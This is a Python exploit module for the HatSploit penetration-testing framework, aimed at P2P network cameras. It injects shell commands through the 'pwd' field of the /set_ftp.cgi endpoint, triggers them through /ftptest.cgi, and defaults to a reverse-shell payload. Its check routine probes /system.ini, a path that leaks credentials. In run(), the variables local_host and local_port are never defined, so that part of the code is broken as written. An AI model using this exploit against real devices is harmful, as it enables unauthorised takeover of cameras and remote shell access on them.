#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient
from pex.string import String


class HatSploitModule(Module, HTTPClient, String):
    details = {
        'Category': "exploit",
        'Name': "P2P Camera Authenticated RCE",
        'Module': "exploit/linux/generic/p2p_authenticated_rce",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Pierre Kim (pierrekim) - vulnerability researcher',
        ],
        'Description': "P2P network camera authenticated remote code execution.",
        'Platform': "linux",
        'Rank': "high",
    }

    payload = {
        'Value': "linux/x64/shell_reverse_tcp",
        'Architectures': ['mipsle', 'mipsbe', 'generic'],
        'Platforms': ['linux', 'unix'],
        'Types': None,
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 81,
            'Type': "port",
            'Required': True,
        },
        'USERNAME': {
            'Description': "Username for authorization.",
            'Value': "admin",
            'Type': None,
            'Required': True,
        },
        'PASSWORD': {
            'Description': "Password for authorization.",
            'Value': None,
            'Type': None,
            'Required': True,
        },
    }

    def exploit(self, remote_host, remote_port, username, password, command):
        self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=(
                f'/set_ftp.cgi?next_url=ftp.htm&loginuse={username}&loginpas={password}'
                f'&svr=192.168.1.1&port=21&user=ftp&pwd=$({command})&dir=/&mode=PORT&upload_interval=0'
            ),
        )

        self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=(
                f'/ftptest.cgi?next_url=test_ftp.htm&loginuse={username}&loginpas={password}'
            ),
        )

    def check(self):
        remote_host, remote_port, _, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/system.ini?loginuse&loginpas",
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, username, password = self.parse_options(self.options)

        self.module_handle(
            host=local_host,
            port=local_port,
            remote_host=remote_host,
            method="echo",
            sender=self.exploit,
            args={
                'remote_host': remote_host,
                'remote_port': remote_port,
                'username': username,
                'password': password,
            },
        )
